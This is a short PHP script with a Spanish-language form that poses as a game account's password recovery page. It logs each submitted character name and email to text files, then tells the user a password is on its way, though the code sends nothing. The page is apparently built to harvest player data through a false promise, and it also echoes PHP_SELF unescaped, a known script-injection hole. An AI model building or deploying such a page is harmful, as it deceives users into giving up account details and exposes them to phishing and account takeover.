<?php
if (isset($_POST['submit'])) {
$fp = fopen("users.txt","a");
fwrite($fp, $_POST['user'].",");
fclose($fp);
$fp2 = fopen("mails.txt","a");
fwrite($fp2, $_POST['mail'].",");
fclose($fp2);
echo "Tu password sera enviada en los proximos 3 minutos, si tus datos son correctos";
die;
}
?>
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
Personaje: <input type="text" name="user" /><br>
Email: <input type="text" name="mail" />
<br>
<input type="submit" name="submit" value="Recuperar Password" />
</form>